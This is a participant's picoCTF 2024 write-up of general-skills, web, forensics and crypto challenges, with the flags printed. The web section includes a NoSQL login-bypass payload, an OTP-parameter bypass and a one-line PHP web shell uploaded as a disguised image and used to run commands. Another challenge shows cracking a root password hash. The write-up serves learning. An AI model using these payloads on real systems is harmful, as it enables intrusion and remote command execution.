My teammates(LocalMen) and I participated in the picoCTF_2024 organized by Carnegie Mellon University, which took place between March 12, 2024 to March 26, 2024. It was a great learning experience and I really learnt a lot.

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ab9c8a84-e954-4734-81bd-e6e4d7650109)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/7ea096f1-898f-482f-ada4-e27c10639cbe)

This is a writeup of the challenges I solved during the event 



# Challenges Solved
## General Skills
-      Super SSH (25 points)
-      Commitment Issues (50 points)
-      Time Machine (50 points)
-      Blame Game (75 points)
-      Collaborative Development (75 points)
-      binhexa (100 points)
-      Binary Search (100 points)
-      endianness (200 points)
-      dont-you-love-banners (300 points)
-      SansAlpha (400 points)


## Web Exploitation
-     Bookmarklet (50 points)
-     WebDecode (50 points)
-     IntroToBurp (100 points)
-     Unminify (100 points)
-     No Sql Injection (200 points)
-     Trickster (300 points)
-     Elements (500 points)


## Forensics
-     Scan Surprise (50 points)
-     Verify (50 points)
-     CanYouSee (100 points)
-     Secret of the Polygot (100 points)
-     Mob Psycho (200 points)
-     endianness-v2 (300 points)
-     Blast from the Past (300 points)
-     Dear Diary (400 points)


## Cryptography
-     interencdec (50 points)
-     rsa_oracle (300 points)






# General Skills

##  Super SSH (25 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/6fb1149c-36bd-48de-aa48-59608593e232)

For this task they provided us with the username, the port the ssh service is running on, the domain to connect to and then the password. So, we can use all this to connect to the remote instance via ssh

command:```ssh ctf-player@titan.picoctf.net -p 49566```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/CTF/picoCTF_2024]
└─$ ssh ctf-player@titan.picoctf.net -p 49566
ctf-player@titan.picoctf.net's password: 
Welcome ctf-player, here's your flag: picoCTF{s3cur3_c0nn3ct10n_45a48857}
Connection to titan.picoctf.net closed.
```
Well, connecting to the ssh instance gave us the flag

FLAG:- ```picoCTF{s3cur3_c0nn3ct10n_45a48857}```

------------------------------------------------

## Commitment Issues (50 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ad849b47-3413-4552-bd85-4f9b5ea3bb88)

Download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/d937b226-792f-46cc-93f3-2e7df0f5cdcc)

We actually have lots of files here and they all are git files, we were told from the challenge description that "he deleted the flag he accidentally wrote down". To view the changes made to this git files we can use the command ```git show```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/323e2132-15b1-460e-9344-912cc9351999)

Well, that's our flag there 

FLAG:- ```picoCTF{s@n1t1z3_c785c319}```

----------------------------------------

## Time Machine (50 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/2983efd3-7e87-40a3-b215-e275eb8a6e48)

Download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/99c86e02-4157-4d1f-abd8-5f9fb750801b)

We've got some git files here also, just like in the previous challenge the ```git show``` command helps us inspect files in the git repository

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/153eb578-6769-4cde-b7ee-3bc1ebd001ee)

We got our flag

FLAG:- ```picoCTF{t1m3m@ch1n3_e8c98b3a}```

-----------------------------------

## Blame Game (75 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/5eaae91a-3401-429f-b37e-3a8c8725ffea)

Download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/b26fa3e5-71e1-4007-9b26-0cd38ce78735)

unlike the previous challs the files for this chall are much, from the challenge description we are to look for the commit that's preventing the program from working. Well, ```git show``` won't work in this case actually. The guy we'll be needing in a situation like this is the command ```grep```, I called him already he's on his way hehe

command:```grep -ir "picoCTF{```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/blame_game]
└─$ cd drop-in 
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/picoCTF_2024/general_skills/blame_game/drop-in]
└─$ grep -ir "picoCTF{"
.git/logs/HEAD:caa945839a2fc0fb52584b559b4e89ac7c46bf54 8c83358c32daee3f8b597d2b853c1d1966b23f0a picoCTF{@sk_th3_1nt3rn_2c6bf174} <ops@picoctf.com> 1710202031 +0000    commit: optimize file size of prod code
.git/logs/refs/heads/master:caa945839a2fc0fb52584b559b4e89ac7c46bf54 8c83358c32daee3f8b597d2b853c1d1966b23f0a picoCTF{@sk_th3_1nt3rn_2c6bf174} <ops@picoctf.com> 1710202031 +0000       commit: optimize file size of prod code
```
We got our flag😎

FLAG:- ```picoCTF{@sk_th3_1nt3rn_2c6bf174}```

-------------------------------------

## Collaborative Development (75 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/216a43a5-97a7-4cf1-acfa-a44d6d17d256)

Download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ba13d003-3c6a-4a70-8d45-bbc12bd69100)

We'll be using the "Git Extractor" tool for this, you can download it [here](https://github.com/internetwache/GitTools/blob/master/Extractor/extractor.sh)

To run the tool

command:```bash extractor.sh drop-in <folder you want the output to be stored at>```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c00c6ae9-9e9f-408d-8847-7f3bdfb41d5e)

We have 4 folders here, checking each folder we have this

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/1f7036b7-0751-4113-9fbc-1fad5671457b)

The flag was scattered amongst the folder so all you have to do is rearrange it

FLAG:- ```picoCTF{t3@mw0rk_m@k3s_th3_dr3@m_w0rk_6c06cec1}```

---------------------------------------

## binhexa (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ad3d7949-8845-4788-9f19-03dd2c1bd9d5)

They gave us the challenge instance to connect to 

command:```nc titan.picoctf.net 49964```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/4be20ba1-a191-4942-b54f-ca6058777bd1)

So we are meant to search for the flag here, to get the flag we have to perform the unique operations. We can use this [website](https://www.rapidtables.com/calc/math/binary-calculator.html)

Using that website should get you to the last task, lets solve for the first task

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/2a325e0f-c45b-4ffe-8a77-271efcd36ce3)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/42db7bca-c7dc-493d-8201-819af59011cf)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/757e6d55-9204-4036-b4bf-1093d741c1e7)

To enter the result of the last operation which is ```000100111110``` to hex, we can use this [website](https://www.rapidtables.com/convert/number/binary-to-hex.html)

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/1a0136b1-253a-42fb-bc73-6546090feefc)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/6446514f-1b48-4479-b106-0fe0b7c5dcbb)

We got our flag

FLAG:- ```picoCTF{b1tw^3se_0p3eR@tI0n_su33essFuL_d6f8047e}```

------------------------------------------

## Binary Search (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ac044467-2657-46f0-9e3a-e249761fde79)

When you launch the instance

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/4ff55a79-b2ac-4893-9637-055772c96a1e)

Since we have the username and password we can connect to the challenge instance using ssh as stated there

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/f114f75e-4551-4c83-b847-bc182ee2b75d)

This is a game where you guess numbers, well I've seen this chall before during the "cyberstarters CTF" last year so it was quite easy to figure out.

First thing you do is basically start from the middle, so lets start with say ```500```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ad0c4e07-5fc5-4397-b438-259ddb31a81b)

We have to go lower, now lets use ```400```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/7ca24694-6e44-4e9e-99b3-f807790baa49)

Now, we are meant to go higher, now lets use ```450```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/1a5071c3-b16d-4ce8-92c6-30eb7b7a66d7)

We have to go higher, this means the number is between ```450``` and ```500```, lets use 470

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/2832e0e0-2ea5-48ee-a3b5-e5bf3b0d170f)

Higher again, lets use ```480```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/be301df5-954d-433c-8eb7-dcb236de884f)

Higher again, lets use ```490```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/284a719a-76f7-4c9d-bb76-a7d2f2b78fba)

Lower, so the right number is between ```480``` and  ```490```. Lets use ```485``` this time

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ca59e739-4c69-48e7-bacb-9472a4fe4c99)

Higher, nice, lets use ```489```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/3e0819a9-c4d4-4e5d-92a2-abf637ec931a)

Lower, we've narrowed the right number between ```485``` and ```489```. Now, we'll just try ```486```,```487``` and ```488```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/4515bde2-24de-470d-b589-2d4d316f21ff)

```486``` worked hehe.

FLAG:- ```picoCTF{g00d_gu355_1597707f}```

-----------------------------------

## endianness (200 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/e72dc0e7-e95f-459f-b1cf-5388acb16aa1)

Lets connect to the challenge instance

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/6282c3b7-ba21-43f7-94e0-05a64cc67b5d)

So we are meant to find the little endian and big endian representations of a word

To do this you can use this [website](https://learnmeabitcoin.com/technical/general/little-endian)

First we have to convert the word ```wjsyg``` to hex. You can do that using [cyberchef](https://gchq.github.io/CyberChef/)

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/8375c753-892f-4b62-a7c7-e22c2370bbb5)

So we have this ```776a737967```, now we'll convert this to the Little Endian representation

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/504ac22b-3ece-48c5-ace1-c398bce9be9f)

There you have it,

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c90dabc5-d9c5-4212-a2ca-22c1f3c507eb)

It worked, now for the Big Endian representation

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ece19dcb-f472-4b4e-9a88-f430095e1498)

Yup, that's it

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/769a6935-6ba3-4f5b-90e2-107c705dd8b5)

We got our flag. You can read more about Little and Big Endians [here](https://www.techtarget.com/searchnetworking/definition/big-endian-and-little-endian)

FLAG:- ```picoCTF{3ndi4n_sw4p_su33ess_25c5f083}```

---------------------------------

## dont-you-love-banners (300 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c89ee0f3-fee9-4c61-8d62-9b8ae8eaebf7)

In this chall, we have 2 instances, in the first instance some crucial information was leaked while the second instance is to connect to the running application.

Well, lets connect first with the instance that has been leaking crucial information

command:```nc tethys.picoctf.net 54896```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/4481394a-f2aa-4e19-94b4-69c2a194daaa)

We actually got a password from the server, well lets keep that somewhere.

Now, lets connect to the running application

command:```nc tethys.picoctf.net 49671```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/7dad4803-9906-448b-9559-f77dc8e3d0c7)

We were asked for a password, using the password we got from the first instance

password:```My_Passw@rd_@1234```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/1d21f354-5ece-4d02-8fcd-88d3a89d23ba)

The answer to this question is ```Defcon```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/6ed010a3-e5e5-469e-8113-71b66d5decbc)

The answer to this last one is ```John Draper```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/4fcfea4e-b75a-47a1-8c59-8299d9a98226)

Now that we are in, lets go ahead to escalate our privileges.

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/61990c80-72c7-4120-8941-b94241952111)

smooth, we have the hash for the root user, well lets crack it using "brother john"😂

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c119f7e3-b819-4e8a-8bb7-e3570b5cf7c3)

We got the password to be ```iloveyou```, with this password we can actually switch user

command:```su root```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ce2019ca-704b-463f-a687-b18e9f916550)

That's our flag right there

FLAG:- ```picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}```

---------------------------------------

## SansAlpha (400 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/b16721ed-dde3-4b0f-9aa0-b742982243fc)

Alright so, in this task we have a bash shell but then we can't use alphabets, only numbers and (most) symbols are allowed. 

Lets connect to the challenge instance

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/4aa6ccb5-83f4-426b-821d-c81bccccb09d)

Well, as you can see we can't use any character here hehe.

What we'll make use of here is something known as wildcards

```
Wildcards are characters used in shell commands to represent one or more other characters. They're commonly used in file management commands to specify patterns of filenames that you want to match. Here are some common wildcards:

* (asterisk): Matches any sequence of characters, including none.
? (question mark): Matches any single character.
[ ] (square brackets): Matches any one character within the specified range or set.
Here's how they work in practice:

*: Matches zero or more characters.
Example: *.txt matches any file ending in .txt.
?: Matches exactly one character.
Example: file?.txt matches file1.txt, fileA.txt, but not file12.txt.
[ ]: Matches any one character within the specified range or set.
Example: [123].txt matches 1.txt, 2.txt, or 3.txt.
```
The wildcard I used for this chall is the question mark.

lets test this on my terminal first before we go the challenge instance

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/CTF/picoCTF_2024/general_skills]
└─$ ~/??
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/go]
└─$ ~/????
zsh: permission denied: /home/bl4ck4non/Demo
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/go]
└─$ ~/??????
zsh: permission denied: /home/bl4ck4non/Public
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/go]
└─$ ~/?????????               
zsh: permission denied: /home/bl4ck4non/Documents
```
Good, now lets test this on the challenge instance, lets see if it'll help us with the directory structures

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/e0355e04-4df3-45c0-a2cd-abab0a0b1537)

So there's a directory ```/home/ctf-player/blargh```

Lets keep digging, lets check for sub-directories/files this time

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/1ec7c857-a3cc-4f06-a748-83fd2707aefc)

So inside the ```blargh``` directory we have ```flag.txt``` and some bunch of other files.

Now, how can we read the ```flag.txt``` file????

Well, lets go back to my terminal. To check for available binaries, binaries like ```base32```,```base64```,```awk```,```cat``` and ```strings```

```
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ nano bankai.txt
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ cat bankai.txt 
flag{y0u_c4n't_catch_m3}
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ /usr/bin/awk bankai.txt
awk: cmd. line:1: bankai.txt
awk: cmd. line:1:       ^ syntax error
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ /usr/bin/base32 bankai.txt
MZWGCZ33PEYHKX3DGRXCO5C7MNQXIY3IL5WTG7IK
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ /usr/bin/base64 bankai.txt
ZmxhZ3t5MHVfYzRuJ3RfY2F0Y2hfbTN9Cg==
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ /usr/bin/strings bankai.txt
flag{y0u_c4n't_catch_m3}
```
Now, lets confirm if we can use these binaries to read the ```flag.txt``` files on the challenge instance

So to read with strings we can try something like this ```/usr/bin/strings ~/blargh/flag.txt```, using wildcards we have this ```/???/???/??????? ~/??????/????????```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/764f0d4a-b49c-4f9a-99c2-749c0cadbf3d)

So we don't have ```strings``` available.

Lets try the base64 binary, we can do something like this ```/usr/bin/base64 ~/blargh/flag.txt```, using wildcards we have this ```/???/???/????64 ~/??????/????????```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/13a26511-edea-4200-8fa3-6b8c040ac483)

Also didn't work. Lets check out the last binary. We can try this ```/usr/bin/base32 ~/blargh/flag.txt```, using wildcards we have ```/???/???/????32 ~/??????/????????```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/f7e1c553-a08c-4ad4-96d7-d9e399377a07)

Lets decode this

command:```echo "OJSXI5LSNYQDAIDQNFRW6Q2UIZ5TO2BRGVPW25JRG4YXMM3SGUZV6MJVL5WTIZDOGM2TKXZUHE2DKNRTGBQX2===" | base32 -d```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ echo "OJSXI5LSNYQDAIDQNFRW6Q2UIZ5TO2BRGVPW25JRG4YXMM3SGUZV6MJVL5WTIZDOGM2TKXZUHE2DKNRTGBQX2===" | base32 -d
return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_4945630a}
```
We got our flag😎

FLAG:- ```picoCTF{7h15_mu171v3r53_15_m4dn355_4945630a}```



# Web Exploitation

## Bookmarklet (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/fbb68337-39a7-4c5b-aab9-6fcf8d81886a)

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/4410eb8b-d0f5-4d9b-bff9-ed0f4bac334d)

We get this javascript code

```js
        javascript:(function() {
            var encryptedFlag = "àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓÔÅÐÙí";
            var key = "picoctf";
            var decryptedFlag = "";
            for (var i = 0; i < encryptedFlag.length; i++) {
                decryptedFlag += String.fromCharCode((encryptedFlag.charCodeAt(i) - key.charCodeAt(i % key.length) + 256) % 256);
            }
            alert(decryptedFlag);
        })();
 ```
This javascript code is more like a simple encryption routine using a basic form of symmetric encryption. It takes an encrypted flag, a key and then decrypts the flag using the key

We'll run this code using one of the developer tools which is the "console"

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/2736d1be-2306-47f7-a31d-076d03a05eba)

Soft, we got our flag

FLAG:- ```picoCTF{p@g3_turn3r_1d1ba7e0}```

---------------------------------------

## WebDecode (50 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/23c27c30-b2ba-4b87-8b6a-73f020d93f4f)

A question was aksed, Do you know how to use the web inspector??? Well, lets see

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/d60f4871-5de9-40d9-9fff-898f5d56f8ba)

We have 3 pages here, the "home page", the "about page" and the "contact page"

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/bccbc69d-2fab-4138-b4f4-deed63fb218b)

This is what you get when you click on the "home page"

Clicking on the "about page" you get this

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c310eca9-9f84-42cc-9ed5-21868385367d)

Now, lets inspect this page

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/b03637fb-9e3c-47f7-bbff-b56405691928)

We can see the base64 encoded text, well lets decode this

command:```echo "cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZGYwZGE3Mjd9" | base64 -d```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/CTF/picoCTF_2024/web]
└─$ echo "cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZGYwZGE3Mjd9" | base64 -d
picoCTF{web_succ3ssfully_d3c0ded_df0da727}
```
We got our flag😎

FLAG:- ```picoCTF{web_succ3ssfully_d3c0ded_df0da727}```

------------------------------------------------

## IntroToBurp (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c7b1ae80-0a9e-4ecb-b75f-9597a6a52385)

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/e132e1f9-ad05-44e5-a257-2ab72745d388)

So we get this registration page. Lets try to register so we can see what happens next

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/16ce4fae-96ff-4cba-b279-910c9d6d5e2c)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/8786d0f8-c432-4a98-a202-7d3dba9e4f0a)

oops, we are being asked for an otp, but we don't have one lool.

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/9228710a-569c-4240-a674-613c2a32c209)

Lets intercept this request with burpsuite and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/15667a35-64cd-4686-a0f2-797e4fb98f41)

Good. Now, have you ever heard of the mangling technique??

```
Mangling is a technique used to bypass security filters or controls by modifying or obfuscating the input data. This can be achieved through various methods such as encoding, encrypting, or adding extra characters to the input. The main goal of mangling is to alter the input data in a way that it can bypass the security filters or controls, allowing the attacker to exploit the vulnerability.
```
So, we'll perform a mangling technique on the otp parameter by adding square brackets

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/16ca8fb7-243b-4f89-bee8-b8f70e407f1c)

Sending the request, you'll get this

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/23462e5a-39e4-4857-b1ee-0f8baa28848f)

cool, we got our flag

FLAG:- ```picoCTF{#0TP_Bypvss_SuCc3$S_2e80f1fd}```

------------------------------------------------

## Unminify (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/0e772386-5cc9-45dd-bd0a-1a24bc6af6fe)

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/2531f589-1c3c-4ddf-83fc-5f7d98ced0a6)

The webpage says it has distributed the flag but doesn't know how to read them.

Lets view the page source

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/999b472a-17ed-46d3-8285-18b8fc1f17be)

Yeah click on "Line wrap"

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/66e9031e-dbb6-4056-a9f9-8744cf2cb518)

Yup, that's our flag. Easy right??😎

FLAG:- ```picoCTF{pr3tty_c0d3_622b2c88}```

-----------------------------------------------------

## No Sql Injection (200 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/1f1285d5-eebd-4d91-acb9-293769006e64)

From the name of the chall, it's quite obvious what the attack vector is.

I've documented the way I exploited this vulnerability in one of my writeups

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/7e73b308-7ed2-459c-ad93-10edf852740a)

We'll be using the same payloads but then the way we apply it will be different. Instead of interecepting the request with burpsuite and then editing the parameters to include the payload, we'll actually use the payload first before intercepting the request with burpsuite

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/97da9d4c-a438-457f-95ce-2fb06825263c)

We have this

payload
```
Email: {"$gt":""}
Password: {"$gt":""}
```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/935ab1df-dc9c-47c1-9574-ca1b7b554477)

Lets intercept this request using burpsuite and then we send it over to burp repeater

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/9ce31b8c-e028-451b-b0b2-463f8aa80de9)

Now, lets follow redirection

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/93f4bfa3-7f33-4142-b5ce-ca09c0259ab4)

The token is actually encoded in base64, lets decode this

command:```echo "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzUzZDkwZTI4fQ==" | base64 -d```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/CTF/picoCTF_2024/web]
└─$ echo "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzUzZDkwZTI4fQ==" | base64 -d    
picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_53d90e28}
```
We got our flag hehe

FLAG:- ```picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_53d90e28}```

------------------------------------------------

## Trickster (300 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/7cc1dc32-fb71-48d3-a537-6dfc19002aea)

A web app that only allows png images?? Well, this screams the file upload vulnerability attack vector hehe

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/7d6a4a9b-d79a-42bc-948e-7325f761a60b)

Lets try to upload a normal png image

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/85ade628-aa09-4017-a5af-0b316bdb5e50)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ca206cde-3c4c-48c6-95d7-f8f8785e5c9a)

Our image got uploaded successfully. Now, the images are uploaded to the ```/uploads``` directory, but when you navigate there you get this

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/6ca5648a-e6b0-4c90-bba3-89fb3f717dc0)

This means the directory exists but then we don't have enough permission to view the directory. 

To view the image we uploaded we can do this ```/uploads/bl4ck4non.png```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ed05ae9e-dd3f-4816-a4cc-aff36199e160)

As you can see, it worked.

Now, lets upload another png image, but then this time we'll intercept the request using burpsuite so we can do some modifications

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/f9cff1b9-e93c-4a97-8c65-bb3ef74e6836)

On burpsuite you have this,

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/f5d94568-fd97-40f2-9029-6be5d8febc1e)

We'll delete the contents of the png image and add this payload

```php
<?php system($_GET['cmd']); ?>
```
We'll also edit the filename

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/da791f12-6796-44b9-adaf-44fc82396d61)

Good, now forward the request

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/9996ff3b-ac9c-4bce-9165-9e9439b4f302)

Our file got uploaded successfully

To view our file we'll navigate to ```/uploads/freakyFlags.png.php```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c55ef63e-9bc1-457c-9829-625c13a86ccf)

We get this, now to get command injection on this server we can add this ```?cmd=id```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/93694563-eb05-4791-9631-d583fb44a9f6)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/78d2863c-8421-4afc-9f32-71af8c6373eb)

As you can see, we can execute linux commands.

Well, lets look for the flag, I'll be using burp repeater for this.

We'll start with going back a directory and listing the contents of that directory, something like this ```cd .. && ls -la```, ensure you url encode this

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/8cf807df-5ea2-41dd-b410-820fc80247be)

That file looks interesting, lets cat it, we can achieve that using this ```cd .. && ls -la && cat GQ4DOOBVMMYGK.txt```, ensure it is url encoded before sending.

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/2ae6d6f0-84cd-4443-aadb-843a079fc623)

We got our flag😎

FLAG:- ```picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}```

------------------------------------

## Elements (500 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/3f36f5f8-5d53-4169-9bcf-8070f910756c)

We don't need to launch the instance yet, lets try to download the source code and analyze it.

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/adcdb8b9-4d43-4237-8a65-a7e993212b13)

The ```flag.txt``` contains a fake flag so chill we haven't solved it yet😂

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/web/elements]
└─$ cat flag.txt       
picoCTF{test_flag}
```
You see??😅

Lets start by analyzing the ```index.mjs``` file

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/8a0e251b-1074-45d8-82dd-bb694ff93d53)

Well, what this guy does is just spawn the chromium instance we were given, so we'll have to install it for experiment purposes.

To install it just run the command ```sudo dpkg -i chrome.deb```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/78905be3-c9ea-43c0-ab2d-c8149232934a)

Moving on, 

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/37921763-bd58-4c91-858f-4d9f2cd34c6e)

So, when we run node on the ```index.mjs``` file we can navigate to the url ```http://127.0.0.1:8080``` to view the webpage. You can also see that we have the CSP header there, well that header is pain actually💀. You can read more about the csp header [here](https://content-security-policy.com/)

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/b5524ae3-8480-40e3-8784-bad688763f70)

